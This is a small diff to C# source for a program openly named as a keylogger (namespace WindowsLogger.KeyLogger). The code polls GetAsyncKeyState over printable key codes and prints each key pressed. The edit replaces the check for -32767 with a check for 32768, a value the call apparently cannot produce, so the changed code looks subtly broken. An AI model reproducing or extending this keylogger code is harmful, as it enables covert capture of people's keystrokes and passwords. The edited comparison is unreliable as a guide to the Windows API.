@@ -26,7 +26,7 @@ namespace WindowsLogger.KeyLogger
 				for (int i = 32; i < 127; i++)
 				{
 					int keyState = GetAsyncKeyState(i);
-					if (keyState == -32767)
+					if (keyState == 32768)
 					{
 						Console.Write((char) i + ", ");
 					} 
